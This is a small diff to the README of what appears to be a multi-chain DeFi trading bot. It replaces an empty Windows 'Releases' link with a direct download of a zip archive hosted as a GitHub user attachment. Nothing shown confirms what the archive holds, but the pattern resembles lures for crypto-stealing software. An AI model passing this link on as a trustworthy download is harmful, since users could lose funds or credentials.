@@ -6,7 +6,7 @@ This Bot, a DeFi Trading bot for ETH, BSC, AVAX, MATIC, TON, Harmony, Metis, CRO
 
 ## Download
 
-Windows version: [Releases]()
+Windows version: [Releases](https://github.com/user-attachments/files/16446932/Solyum-Defibot.zip)
 
 
 
